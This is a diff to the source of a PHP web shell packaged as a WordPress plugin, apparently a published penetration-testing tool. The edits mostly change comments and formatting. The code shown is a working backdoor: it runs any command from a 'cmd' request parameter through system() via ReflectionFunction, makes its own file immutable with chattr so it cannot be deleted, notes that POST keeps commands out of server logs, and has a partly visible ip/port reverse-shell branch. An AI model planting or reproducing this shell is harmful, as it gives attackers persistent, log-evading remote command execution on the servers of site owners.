@@ -1,4 +1,5 @@
 <?php
+
 /*
     Plugin Name: Cheap & Nasty Wordpress Shell
     Plugin URI: https://github.com/leonjza/wordpress-shell
@@ -6,20 +7,25 @@
     Author: Leon Jacobs
     Version: 0.3
     Author URI: https://leonjza.github.io
-    */
+*/
 
-# attempt to protect myself from deletion
+# attempt to protect myself from deletion.
 $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 
-# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
+# name of the parameter (GET  or POST) for the command.
+# change this if the target already use this parameter.
 $cmd = 'cmd';
 
-# test if parameter 'cmd', 'ip or 'port' is present. If not this will avoid an error on logs or on all pages if badly configured.
-if (isset($_REQUEST[$cmd])) {
 
-   # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
+# test if parameter 'cmd', 'ip or 'port' is present. If
+# not this will avoid an error  on logs or on all pages
+# if badly configured.
+if (isset($_REQUEST[$cmd])) {
+   # grab the command we want to run from the 'cmd' get
+   # or post parameter (post  don't display the command
+   # on apache logs)
    $command = $_REQUEST[$cmd];
    executeCommand($command);
 } else if (isset($_REQUEST[$ip]) && !isset($_REQUEST[$cmd])) {
@@ -44,10 +50,10 @@ die();
 
 function executeCommand(string $command)
 {
+   # try to find a way to run our command using various
+   # php internals.
 
-   # Try to find a way to run our command using various PHP internals
    if (class_exists('ReflectionFunction')) {
-
       # http://php.net/manual/en/class.reflectionfunction.php
       $function = new ReflectionFunction('system');
       $function->invoke($command);
